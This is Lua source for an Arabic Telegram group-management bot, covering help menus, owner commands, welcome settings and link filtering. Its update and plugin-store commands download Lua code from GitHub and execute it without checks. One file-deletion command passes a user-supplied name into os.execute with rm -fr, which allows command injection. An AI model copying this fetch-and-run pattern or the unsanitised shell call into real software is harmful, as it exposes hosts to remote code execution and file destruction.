if text and text:match("^م٥$") or text and text:match("^م5$") or text and text:match("^اوامر5$") or text and text:match("^اوامر٥$") then
if not SudoBot(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ هذا الامر للمطورين فقط ', 1, 'md')
else
local Help = DevBrAnD:get(BrAnD..'BrAnD:Help5')
local text =  [[
♰ ⌯ اوامر المطورين ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ الكروبات
♰ ⌯ المطورين
♰ ⌯ المشتركين
♰ ⌯ الاحصائيات
♰ ⌯ المجموعات
♰ ⌯ اسم البوت + غادر
♰ ⌯ اسم البوت + تعطيل
♰ ⌯ كشف + -ايدي المجموعه
⍆═════BR═════⍅
♰ ⌯ رفع • تنزيل ↫ مدير عام
♰ ⌯ حذف • المدراء العامين 
♰ ⌯ رفع • تنزيل ↫ ادمن عام
♰ ⌯ حذف • الادمنيه العامين 
♰ ⌯ رفع • تنزيل ↫ مميز عام
♰ ⌯ حذف • المميزين عام 
⍆═════BR═════⍅
♰ ⌯ اوامر المطور الاساسي ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ تحديث
♰ ⌯ الملفات
♰ ⌯ المتجر
♰ ⌯ السيرفر
♰ ⌯ روابط الكروبات
♰ ⌯ تحديث السورس
♰ ⌯ تنظيف الكروبات
♰ ⌯ تنظيف المشتركين
♰ ⌯ حذف جميع الملفات
♰ ⌯ تعيين الايدي العام
♰ ⌯ حذف معلومات الترحيب
♰ ⌯ تغير معلومات الترحيب
♰ ⌯ غادر + -ايدي المجموعه
♰ ⌯ تعيين عدد الاعضاء + العدد
♰ ⌯ حظر عام • الغاء العام
♰ ⌯ كتم عام • الغاء العام
♰ ⌯ قائمه العام • حذف قائمه العام
♰ ⌯ وضع • حذف ↫ اسم البوت
♰ ⌯ اضف • حذف ↫ رد عام
♰ ⌯ ردود المطور • حذف ردود المطور
♰ ⌯ تعيين • حذف • جلب ↫ رد الخاص
♰ ⌯ جلب نسخه الكروبات
♰ ⌯ رفع النسخه + بالرد على الملف
♰ ⌯ تعيين • حذف ↫ قناة الاشتراك
♰ ⌯ جلب كليشه الاشتراك
♰ ⌯ تغيير • حذف ↫ كليشه الاشتراك
♰ ⌯ رفع • تنزيل ↫ مطور
♰ ⌯ المطورين • حذف المطورين
♰ ⌯ تعيين • حذف ↫ كليشة الايدي
♰ ⌯ اذاعه للكل بالتوجيه ↫ بالرد
⍆═════BR═════⍅
♰ ⌯ تفعيل ملف + اسم الملف
♰ ⌯ تعطيل ملف + اسم الملف
♰ ⌯ تفعيل • تعطيل + الامر ↫ ⤈
♰ ⌯ الاذاعه • الاشتراك الاجباري
♰ ⌯ ترحيب البوت • المغادره
♰ ⌯ البوت الخدمي • التواصل
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text and text:match("^تعيين امر م6$") and Sudo(msg) or text and text:match("^تعيين امر م٦$") and Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة (م6) الان " ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BrAnDTeAM=  DevBrAnD:get(BrAnD..'BrAnD:Help61'..msg.sender_user_id_)
if BrAnDTeAM== 'msg' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الكليشه الجديده" ,  1, "md")
DevBrAnD:del(BrAnD..'BrAnD:Help61'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Help6', text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
end
if text and text:match("^م٦$") or text and text:match("^م6$") or text and text:match("^اوامر6$") or text and text:match("^اوامر٦$") then
local Help = DevBrAnD:get(BrAnD..'BrAnD:Help6')
local text =  [[
♰ ⌯ اوامر الاعضاء ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ السورس • موقعي • رتبتي • معلوماتي
♰ ⌯ رسائلي • حذف رسائلي • اسمي • معرفي 
♰ ⌯ ايدي •ايديي • جهاتي • غنيلي • الالعاب 
♰ ⌯ نقاطي • بيع نقاطي • القوانين • زخرفه 
♰ ⌯ رابط الحذف • نزلني • اطردني • المطور 
♰ ⌯ منو ضافني • مشاهدات المنشور • الرابط 
♰ ⌯ ايدي المجموعه • معلومات المجموعه 
♰ ⌯ نسبه الحب • نسبه الكره • نسبه الغباء 
♰ ⌯ نسبه الرجوله • نسبه الانوثه • التفاعل
⍆═════BR═════⍅
♰ ⌯ كول + الكلمه
♰ ⌯ زخرفه + اسمك
♰ ⌯ برج + نوع البرج
♰ ⌯ معنى اسم + الاسم
♰ ⌯ احسب + تاريخ ميلادك
♰ ⌯ بوسه • بوسها ↫ بالرد
♰ ⌯ رفع مطي • تنزيل مطي •المطايه
♰ ⌯ هينه • هينها ↫ بالرد • بالمعرف
♰ ⌯ صيحه • صيحها ↫ بالرد • بالمعرف
♰ ⌯ ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
♰ ⌯ تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
--     SoUrCe BrAnD     --
if Sudo(msg) then
if text == "تحديث السورس" or text == "تحديث سورس" then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ جاري تحديث سورس براند ', 1, 'md') 
os.execute('rm -rf BrAnD.lua') 
os.execute('wget https://raw.githubusercontent.com/iq0BrAnD/BrAnD/master/BrAnD.lua') 
dofile('BrAnD.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث♰' then  
dofile('BrAnD.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم تحديث ملفات البوت", 1, "md")
end 
--     SoUrCe BrAnD     --
if text == 'الملفات' then
Files = '\n♰ ⌯ الملفات المفعله في البوت ↫ ⤈ \n⍆═════BR═════⍅\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = '♰ ⌯ لا توجد ملفات في البوت'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "متجر الملفات" or text == 'المتجر' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/iq0BrAnD/BrAnDFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n♰ ⌯ قائمة ملفات متجر سورس براند \n♰ ⌯ الملفات المتوفره حاليا ↫ ⤈\n⍆═════BR═════⍅\n"
local TextE = "⍆═════BR═════⍅\n♰ ⌯ علامة ↫ (✔) تعني الملف مفعل\n♰ ⌯ علامة ↫ (✖️) تعني الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(✔)"
else
CheckFile = "(✖️)"
end
NumFile = NumFile + 1
TextS = TextS.."♰ ⌯ "..Info..' ↫ ⤈\n'..NumFile.."~ : `"..name..'` ↬ '..CheckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"♰ ⌯ لا يوجد اتصال من الـapi") 
end
end
if text == "مسح جميع الملفات" or text == "حذف جميع الملفات" then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"♰ ⌯ تم حذف جميع الملفات المفعله")
end
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/iq0BrAnD/BrAnDFiles/master/BrAnDFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\n♰ ⌯ الملف ↫ *"..FileName.."*\n♰ ⌯ تم تعطيله وحذفه من البوت بنجاح") 
dofile('BrAnD.lua')  
else
send(msg.chat_id_, msg.id_,"♰ ⌯ لا يوجد ملف بهذا الاسم") 
end
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/iq0BrAnD/BrAnDFiles/master/BrAnDFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n♰ ⌯ الملف ↫ *"..FileName.."*\n♰ ⌯ تم تفعيله في البوت بنجاح") 
dofile('BrAnD.lua')  
else
send(msg.chat_id_, msg.id_,"♰ ⌯ لا يوجد ملف بهذا الاسم") 
end
return false
end
end 
--     SoUrCe BrAnD     --
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and Sudo(msg) then    
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حذف معلومات الترحيب', 1, 'md')   
DevBrAnD:del(BrAnD..'BrAnD:Text:BotWelcome')
DevBrAnD:del(BrAnD..'BrAnD:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب') and Sudo(msg) then    
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevBrAnD:del(BrAnD..'BrAnD:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب') and Sudo(msg) then    
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevBrAnD:set(BrAnD..'BrAnD:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب♰') and Sudo(msg) then    
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل لي نص الترحيب', 1, 'md') 
DevBrAnD:del(BrAnD..'BrAnD:Text:BotWelcome')
DevBrAnD:del(BrAnD..'BrAnD:Photo:BotWelcome')
DevBrAnD:set(BrAnD.."BrAnD:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevBrAnD:get(BrAnD.."BrAnD:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء الامر", 1, "md") 
DevBrAnD:del(BrAnD.."BrAnD:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ النص ارسل لي صورة الترحيب\n♰ ⌯ ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevBrAnD:set(BrAnD.."BrAnD:Text:BotWelcome",text) 
DevBrAnD:set(BrAnD.."BrAnD:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevBrAnD:get(BrAnD.."BrAnD:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
DevBrAnD:del(BrAnD.."BrAnD:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevBrAnD:set(BrAnD.."BrAnD:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ النص وصورة الترحيب", 1, 'md')   
DevBrAnD:del(BrAnD.."BrAnD:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     SoUrCe BrAnD     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة المطور الان ", 1, "md")
DevBrAnD:setex(BrAnD.."BrAnD:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف كليشة المطور", 1, "md")
DevBrAnD:del(BrAnD.."DevText")
end end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء الامر", 1, "md") 
DevBrAnD:del(BrAnD.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevBrAnD:del(BrAnD.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevBrAnD:set(BrAnD..'BrAnD:textch:user',texxt)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^تغير كليشه الاشتراك$") and Sudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and Sudo(msg) then  
DevBrAnD:setex(BrAnD.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
local text = '♰ ⌯ حسنا ارسل كليشة الاشتراك الجديده'  
Dev_BrAnD(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" then  
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
DevBrAnD:del(BrAnD..'BrAnD:textch:user')
textt = "♰ ⌯ تم حذف كليشة الاشتراك الاجباري"
Dev_BrAnD(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevBrAnD:get(BrAnD.."BrAnD:textch:user")
if chtext then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ كليشة الاشتراك ↫ ⤈ \n⍆═════BR═════⍅\n['..chtext..']', 1, 'md')
else
local DevBrAnD6 = DevBrAnD:get(BrAnD.."DevBrAnD3")
if DevBrAnD6 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عليك الاشتراك في قناة البوت \n♰ ⌯ قناة البوت ↫ '..DevBrAnD6, 1, "html")
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لم يتم تعيين قناة الاشتراك الاجباري \n♰ ⌯ ارسل ↫ تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
--     SoUrCe BrAnD     --
if text == 'القناة' or text == 'قناة السورس' or text == 'قناه السورس' or text == 'قنات السورس' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ChANnEl ↬ @CXRCX', 1, 'html')    
end 
--     SoUrCe BrAnD     --
if Sudo(msg) then 
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '♰ ⌯ نظام التشغيل ↫ ⤈\n`'"$linux_version"'`' 
echo '⍆═════BR═════⍅\n♰ ⌯ الذاكره العشوائيه ↫ ⤈\n`'"$memUsedPrc"'`'
echo '⍆═════BR═════⍅\ n♰ ⌯ وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '⍆═════BR═════⍅\n♰ ⌯ المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '⍆═════BR═════⍅\n♰ ⌯ الدخول ↫ ⤈\n`'`whoami`'`'
echo '⍆═════BR═════⍅\n♰ ⌯ مدة تشغيل السيرفر ↫ ⤈\n`'"$uptime"'`'
]]):read('*a'), 1, 'md')
end
end
--     SoUrCe BrAnD     --
BrAnDFiles(msg)
--     SoUrCe BrAnD     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
DevBrAnD:incr(BrAnD..'BrAnD:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local BrAnDname = '♰ ⌯ العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
local BrAnDid = '♰ ⌯ ايديه ↫ `'..dp.id_..'`'
local BrAnDtext = '♰ ⌯ قام بالتعديل على الميديا'
local BrAnDtxt = '⍆═════BR═════⍅\n♰ ⌯ تعالو يامشرفين اكو مخرب'
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_  
text = '\n⍆═════BR═════⍅\n'
for i=0 , #admins do 
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, BrAnDname..'\n'..BrAnDid..'\n'..BrAnDtext..text..BrAnDtxt,0,'md') 
end
end,nil)
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     SoUrCe BrAnD     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = DevBrAnD:get(BrAnD..'BrAnD:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChANnElMessage",ChANnEl_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevBrAnD:del(BrAnD..'BrAnD:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChANnElMessage",ChANnEl_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevBrAnD:del(BrAnD..'BrAnD:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChANnElMessage",ChANnEl_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevBrAnD:del(BrAnD..'BrAnD:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChANnElMessage",ChANnEl_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevBrAnD:del(BrAnD..'BrAnD:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     SoUrCe BrAnD     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = DevBrAnD:smembers(BrAnD..'BrAnD:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = DevBrAnD:smembers(BrAnD..'BrAnD:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.status_ and data.type_.ChANnEl_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=BrAnD,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevBrAnD:srem(BrAnD..'BrAnD:Groups',v)  
end
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.status_ and data.type_.ChANnEl_.status_.ID == "ChatMemberStatusLeft" then
DevBrAnD:srem(BrAnD..'BrAnD:Groups',v)  
end
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.status_ and data.type_.ChANnEl_.status_.ID == "ChatMemberStatusKicked" then
DevBrAnD:srem(BrAnD..'BrAnD:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
DevBrAnD:srem(BrAnD..'BrAnD:Groups',v)  
end
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.status_ and data.type_.ChANnEl_.status_.ID == "ChatMemberStatusEditor" then
DevBrAnD:sadd(BrAnD..'BrAnD:Groups',v)  
end end,nil) end
end
--     SoUrCe BrAnD     --
end 
------------------------------------------------
-- This SoUrCe Was Developed By (BrAnD) @s_x_X_G.--
--   This Is The SoUrCe ChANnEl @CXRCX .   --
--                - BrAnD -                 --
--        -- https://t.me/CXRCX --         --
------------------------------------------------ 
